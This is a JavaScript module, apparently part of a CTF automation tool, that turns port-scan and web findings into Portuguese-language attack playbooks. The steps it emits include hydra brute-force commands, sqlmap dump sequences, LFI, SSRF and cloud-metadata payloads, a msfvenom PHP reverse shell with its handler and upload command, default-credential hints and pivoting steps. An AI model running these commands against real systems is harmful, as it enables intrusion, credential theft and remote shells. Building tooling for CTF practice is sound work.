function safeToString(v) {
  return v == null ? '' : String(v);
}

function uniq(arr) {
  return [...new Set(arr.filter(Boolean))];
}

function parseNmapFindingValue(v) {
  // format: "tcp/22 ssh OpenSSH 8.2p1 ..." (criado no pipeline)
  const s = safeToString(v).trim();
  const m = s.match(/^(\w+)\/(\d+)\s+([^\s]+)/);
  if (!m) return null;
  return { proto: m[1].toLowerCase(), port: Number(m[2]), service: m[3].toLowerCase() };
}

export function buildCtfPlaybookSuggestions({ ip, findings = [], flagPathHttpProbe = null } = {}) {
  const suggestions = [];

  const nmap = (findings || []).filter((f) => f && f.type === 'nmap');
  const endpoints = (findings || []).filter((f) => f && (f.type === 'endpoint' || f.type === 'tech'));
  const params = (findings || []).filter((f) => f && f.type === 'param');
  const sqliFindings = (findings || []).filter((f) => f && f.type === 'sqli');
  const exploitFindings = (findings || []).filter((f) => f && f.type === 'exploit');
  const endpointFindings = (findings || []).filter((f) => f && f.type === 'endpoint');
  const techFindings = (findings || []).filter((f) => f && f.type === 'tech');

  const ports = [];
  for (const f of nmap) {
    const p = parseNmapFindingValue(f.value);
    if (p && Number.isFinite(p.port)) ports.push(p);
  }

  const openPortNums = uniq(ports.map((p) => p.port));
  const has = (port) => openPortNums.includes(port);

  const emit = (title, steps, prio = 'med') => {
    suggestions.push({
      prio,
      title,
      steps: Array.isArray(steps) ? steps : [String(steps)],
    });
  };

  // ── Network services ─────────────────────────────
  if (has(21) || ports.some((p) => p.service.includes('ftp'))) {
    emit('FTP (21) aberto → testar anonymous + enum', [
      `ftp ${ip}`,
      `# user: anonymous  pass: (vazio)`,
      `# listar: ls -la  baixar: get <ficheiro>`,
      `# se falhar, tenta: nmap -sV -p 21 --script "ftp-*" ${ip}`,
    ], 'high');
  }

  if (has(22) || ports.some((p) => p.service.includes('ssh'))) {
    emit('SSH (22) aberto → enum básica + brute force com limites', [
      `ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no ${ip}`,
      `# se tiver user(s): hydra -l <user> -P <wordlist> -s 22 -t 4 -W 3 ssh://${ip}`,
    ], 'med');
  }

  if (has(445) || has(139) || ports.some((p) => p.service.includes('microsoft-ds') || p.service.includes('netbios') || p.service.includes('smb'))) {
    emit('SMB (445/139) → enum shares + null session', [
      `smbclient -L //${ip} -N`,
      `smbmap -H ${ip} -u '' -p ''`,
      `enum4linux-ng ${ip}`,
      `# se tiver share: smbclient //${ip}/<share> -N`,
    ], 'high');
  }

  if (has(3306) || ports.some((p) => p.service.includes('mysql'))) {
    emit('MySQL (3306) → testar creds fracas / acesso remoto', [
      `mysql -h ${ip} -u root -p`,
      `nmap -sV -p 3306 --script "mysql-*" ${ip}`,
    ], 'med');
  }

  if (has(5432) || ports.some((p) => p.service.includes('postgres'))) {
    emit('PostgreSQL (5432) → testar enum/creds', [
      `psql "host=${ip} user=postgres dbname=postgres sslmode=disable"`,
      `nmap -sV -p 5432 --script "pgsql-*" ${ip}`,
    ], 'med');
  }

  if (has(6379) || ports.some((p) => p.service.includes('redis'))) {
    emit('Redis (6379) → testar acesso sem auth', [
      `redis-cli -h ${ip} ping`,
      `redis-cli -h ${ip} info`,
    ], 'high');
  }

  if (has(8161) || ports.some((p) => p.port === 8161)) {
    emit('ActiveMQ (8161) → consola web e túnel SSH', [
      `curl -sS http://${ip}:8161/ | head`,
      `# se só escutar em localhost no alvo: ssh -L 8162:127.0.0.1:8161 user@${ip}`,
      `# depois browser em http://127.0.0.1:8162/ — pesquisar CVE (ex.: OpenWire 2023-46604) pela versão`,
    ], 'high');
  }

  if (has(5005) || ports.some((p) => p.service.includes('jdwp'))) {
    emit('JDWP (5005) exposto → risco de debug attach remoto', [
      `# validação segura: confirmar handshake JDWP e bloquear exposição externa`,
      `# hardening: bind em localhost, firewall e remoção de flags de debug em produção`,
      `# se houver compromisso prévio, priorizar rotação de credenciais/tokens da app Java`,
    ], 'high');
  }

  if (has(61616) || has(61613) || has(5672) || has(1883)) {
    emit('Broker/mensageria exposto (ActiveMQ/STOMP/AMQP/MQTT)', [
      `# validar autenticação e ACL por tópico/queue (evitar anonymous/guest)`,
      `# confirmar se portas de broker precisam de exposição pública`,
      `# recolher versão e cruzar CVEs do broker antes de qualquer teste profundo`,
    ], 'high');
  }

  if (has(3000) || ports.some((p) => p.port === 3000)) {
    emit('Porta 3000 (Node/React) → fuzz com Host / paths', [
      `# Node com vhost: ffuf -u http://${ip}:3000/FUZZ -w <wordlist> -H "Host: app.alvo.ctf" -mc 200,204,301,302,401,403`,
      `curl -sS -i http://${ip}:3000/ -H "Host: <nome-do-desafio>"`,
    ], 'med');
  }

  // ── Web hints ───────────────────────────────────
  const urls = uniq(endpoints.map((f) => f.url || '').filter((u) => /^https?:\/\//i.test(u)));
  if (urls.length) {
    emit('Web detectada → checklist rápido (CTF)', [
      `# headers: curl -sS -i -k ${urls[0]}`,
      `# robots/sitemap: /robots.txt /sitemap.xml`,
      `# procurar flag: view-source + grep Solyd{ / HTB{ / GCTF{`,
      `# dir enum: ffuf -u ${urls[0].replace(/\/$/, '')}/FUZZ -w <wordlist> -mc 200,204,301,302,307,401,403`,
    ], 'high');
  }

  const fpTried = Number(flagPathHttpProbe?.tried || 0);
  if (urls.length || fpTried > 0) {
    emit('Flags em texto não HTML + paths CTF (pipeline GhostCTF)', [
      '# nmap: saídas de scripts NSE e banners já passam pelo detector de flags (base64/base32 + regex).',
      '# HTTP: headers repetidos no scan + corpo + stderr curl; robots.txt / sitemap / disclosure (.env) incluídos.',
      fpTried > 0
        ? `# Este run fez ${fpTried} GET(s) extra em paths típicos (/flag, /flag.txt, …) por origem — rever findings tech com via=ctf-flag-paths no JSON/correlação.`
        : '# Com web activa, o servidor tenta também GET em /flag, /flag.txt, /root/flag.txt, … por origem (ver correlation.ctfFlagPathProbe).',
      '# Shell: auto-explore já corre cat em /flag, /flag.txt, /root/flag.txt e find *flag*; em homes: for d in /home/*/.flag*; do cat …',
      '# Pós-login CTF: GHOSTCTF_HTTP_COOKIE="session=…" no .env do servidor, ou campo “Cookie (pós-login)” (httpSessionCookie no POST /api/ghostctf/stream) — curl usa -b em todas as respostas HTTP.',
    ], 'high');
  }

  const hasUploadSurface = (findings || []).some((f) =>
    /possível upload de ficheiro/i.test(safeToString(f?.value)),
  );
  if (hasUploadSurface) {
    emit('Superfície de upload (HTML) → payload + confirmação manual', [
      '# UI GhostCTF: Wandenreich — LHOST/LPORT, gravar em payloads/ ou ngrok; Msfvenom (manual) para CLI',
      '# Kali (se tiveres msfvenom): msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw -o shell.php',
      '# Handler: msfconsole -q -x "use exploit/multi/handler; set payload php/reverse_php; set LHOST IP; set LPORT PORT; exploit -j"',
      '# Upload no browser no formulário ou: curl -k -F "campo=@shell.php" URL_DO_ACTION (ajusta nome do campo)',
      '# Confirmar pasta de uploads e se .php é executado (nem sempre é RCE)',
    ], 'high');
  }

  // ── Param-based attacks (LFI/Traversal/SSRF/OpenRedirect) ──
  const paramBlob = params.map((p) => safeToString(p.value)).join(' ').toLowerCase();
  if (params.length) {
    emit('Parâmetros encontrados → testar LFI/Traversal/Redirect/SSRF', [
      `# LFI: ../../../../../etc/passwd  ..\\..\\..\\..\\windows\\win.ini`,
      `# wrappers PHP (se PHP): php://filter/convert.base64-encode/resource=index.php`,
      `# redirect/ssrf: url=http://127.0.0.1:80/  url=http://169.254.169.254/latest/meta-data/`,
    ], /file|path|page|include|template|load/i.test(paramBlob) ? 'high' : 'med');
  }

  // ── Contextual chains (dinâmico por achado) ─────────────
  const hasLfiHit = params.some((p) => /possível\s+lfi|lfi/i.test(`${p.value} ${p.meta}`));
  if (hasLfiHit) {
    emit('LFI detectado → cadeia de exploração sequencial', [
      '# confirmar leitura estável: /etc/passwd, /proc/self/environ, logs do webserver',
      '# procurar credenciais/config: .env, config.php, wp-config.php, settings.py',
      '# tentar wrappers (PHP): php://filter/convert.base64-encode/resource=<ficheiro>',
      '# procurar chaves/API tokens e reaproveitar em SSH/DB/painéis',
    ], 'high');
  }

  const hasSqlmapHit = sqliFindings.length > 0 || params.some((p) => /sqlmap|sqli|sql injection/i.test(`${p.value} ${p.meta}`));
  if (hasSqlmapHit) {
    emit('SQLMap hit → sequência recomendada (safe-to-deeper)', [
      '# confirmar vetor: sqlmap -u <url> -p <param> --batch --level=3 --risk=3 --current-user --current-db',
      '# enum DB: sqlmap -u <url> -p <param> --batch --dbs',
      '# enum tabelas da DB alvo: sqlmap -u <url> -p <param> --batch -D <db> --tables',
      '# dump seletivo (users/tokens/flags): sqlmap -u <url> -p <param> --batch -D <db> -T <tbl> --dump --where=\"id<50\"',
      '# se suportado: testar file-read/file-write com muita cautela (CTF only)',
    ], 'high');
  }

  const blobAll = (findings || [])
    .map((f) => `${safeToString(f?.value)} ${safeToString(f?.meta)} ${safeToString(f?.url)}`)
    .join(' ')
    .toLowerCase();
  if (/\bws:\/\//.test(blobAll) || /websocket/i.test(blobAll)) {
    emit('WebSocket + SQLi → sqlmap em ws://', [
      '# exemplo: sqlmap -u "ws://host:port/caminho" --data \'{\"id\":\"*\"}\' --batch --dbs',
      '# ajustar JSON ao protocolo real (campo injectável com *)',
    ], 'med');
  }

  if (/wp-config|db_user|db_password/i.test(blobAll)) {
    emit('wp-config / creds DB → MariaDB no CTF', [
      '# com DB_HOST=localhost no servidor: SSH primeiro, depois mysql -u DB_USER -p',
      '# com DB_HOST apontando a IP interno: testar mysql -h <host> -u ... desde a rede permitida',
      '# procurar flags/tabelas: SHOW DATABASES; USE <db>; SHOW TABLES;',
    ], 'high');
  }

  const hasCredReuseHit = /credential reuse ok|credencial potencial|wp-config:db_user\/db_password|password=/.test(blobAll);
  if (hasCredReuseHit && (has(22) || has(3306) || has(61616) || has(61613) || has(5672) || has(5005))) {
    emit('Cadeia de pivot interno (credencial → SSH/DB/broker)', [
      '# validar primeiro login SSH e recolher /etc/hosts, .bash_history e credenciais reaproveitáveis',
      '# com shell: testar DB local/interna (mysql -h 127.0.0.1 e hosts da rede privada) e procurar users.properties/.env',
      '# se broker exposto: confirmar auth em STOMP/AMQP/OpenWire e mapear tópicos/filas antes de ações invasivas',
      '# se JDWP exposto: priorizar mitigação/bloqueio de debug remoto e tratar host como comprometível',
      '# registar rota de movimento lateral (origem, credencial, destino, evidência) no reporte final',
    ], 'high');
  }

  if (/intranet sweep hit:/.test(blobAll)) {
    emit('Pivot intranet orientado por sweep (host interno ativo)', [
      '# priorizar host interno com mais portas abertas (22/3306/5005/61613/61616)',
      '# confirmar alcance de rede a partir do ponto comprometido (não do teu host local)',
      '# repetir enum web/serviços no IP interno prioritário e procurar credenciais reutilizadas',
      '# documentar cada salto (origem -> destino -> credencial/porta) para o relatório técnico',
    ], 'high');
  }

  if (/\b[a-f0-9]{32}\b/i.test(blobAll)) {
    emit('Hashes MD5 (32 hex) em página → lookup rápido', [
      '# CrackStation / hashes.com (só para hashes públicas conhecidas)',
      '# local: john --format=raw-md5 hash.txt --wordlist=<wl>',
    ], 'low');
  }

  if (/\.zip\b|application\/zip|pdf|application\/pdf/i.test(blobAll)) {
    emit('Arquivos ZIP / PDF protegidos → john auxiliares', [
      '# ZIP: zip2john ficheiro.zip > zip.hash && john zip.hash --wordlist=<wl>',
      '# PDF: pdf2john ficheiro.pdf > pdf.hash && john pdf.hash --wordlist=<wl>',
    ], 'med');
  }

  if (/tiny\s*file\s*manager|tinyfilemanager/i.test(blobAll)) {
    emit('Tiny File Manager → credenciais CTF comuns', [
      '# tentar painel: admin / admin@123 (e variações) antes de brute pesado',
      '# após login: procurar ficheiros de config, backups, chaves',
    ], 'med');
  }

  const hasFtpAnonymous = endpointFindings.some((e) => /ftp anonymous permitido/i.test(`${e.value} ${e.meta}`));
  if (hasFtpAnonymous) {
    emit('FTP anonymous confirmado → sequência de enum + pivot', [
      `ftp ${ip}`,
      '# listar profundamente e baixar arquivos de config/backups/keys',
      '# procurar credenciais reaproveitáveis para SSH/MySQL/painéis web',
      '# verificar upload e possível webroot exposure (se aplicável)',
    ], 'high');
  }

  if (exploitFindings.length) {
    emit('Exploit-DB com matches → validar versão antes de executar', [
      '# confirmar versão real no serviço (banner/header/body) e reduzir falso positivo',
      '# reproduzir PoC em modo read-only/check primeiro',
      '# só depois escalar para payload de RCE se o cenário CTF permitir',
    ], 'med');
  }

  const wpBlob = [...techFindings, ...endpointFindings, ...params]
    .map((x) => `${safeToString(x.value)} ${safeToString(x.meta)}`.toLowerCase())
    .join(' ');
  const hasWp = /wordpress|wp-login|xml-rpc|xmlrpc|wp-json|wp user enum|plugin detectado|theme detectado/.test(wpBlob);
  if (hasWp) {
    emit('WordPress foco → cadeia orientada (plugins/users/xmlrpc)', [
      '# confirmar versão e plugins/tema detectados no output do framework',
      '# enum users: /wp-json/wp/v2/users e wp-login responses',
      '# validar xmlrpc exposto (e vetores associados) antes de brute force',
      '# mapear plugins para CVE por versão (priorizar plugins já detectados)',
      '# testar credential reuse (wp-login/ftp/ssh/mysql) com credenciais extraídas',
      '# brute limitado: hydra -L users.txt -P wl.txt site http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:F=Incorrect"',
    ], 'high');
  }

  if (has(22)) {
    emit('Pós-shell SSH → privesc típico CTF', [
      '# linpeas.sh ou lse.sh (rever SUID, cron, capabilities, kernel)',
      '# sudo -l — atenção a GTFOBins (ex.: apt, vim, find)',
      '# doas -l; verificar dstat (CVE-2021-3869) se aparecer em cron',
    ], 'low');
  }

  // fallback
  if (!suggestions.length) {
    emit('Sem playbook automático → próximos passos', [
      'Rever portas/serviços e identificar superfície web.',
      'Rodar enum (SMB/FTP) se aparecerem.',
      'Priorizar erros no HTTP (500/stack trace) e arquivos expostos.',
    ], 'low');
  }

  // dedupe by title
  const seen = new Set();
  const out = [];
  for (const s of suggestions) {
    const key = `${s.prio}|${s.title}`;
    if (seen.has(key)) continue;
    seen.add(key);
    out.push(s);
  }
  return out.slice(0, 30);
}

